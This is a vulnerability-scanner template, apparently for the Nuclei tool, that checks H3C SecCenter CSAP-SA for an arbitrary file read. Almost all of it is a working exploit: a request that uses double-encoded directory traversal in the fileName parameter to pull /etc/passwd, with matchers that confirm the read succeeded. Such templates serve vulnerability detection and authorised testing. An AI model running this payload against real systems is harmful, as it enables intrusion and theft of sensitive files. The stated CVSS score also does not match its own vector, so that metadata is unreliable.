id: h3c-seccenter-csap-sa-fileread
info:
  name: H3C SecCenter CSAP-SA Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  description: |
    H3C SecCenter CSAP-SA is vulnerable to an arbitrary file read issue via the fileName parameter.
    Attackers can exploit this vulnerability to obtain sensitive information.
  reference:
    - https://fofa.so
  classification:
    cwe-id: "CWE-22"
    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    cvss-score: 7.0
  tags: file-read
http:
  - raw:
      - |
        GET /files/downloadByName?fileName=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*?:0:0:"
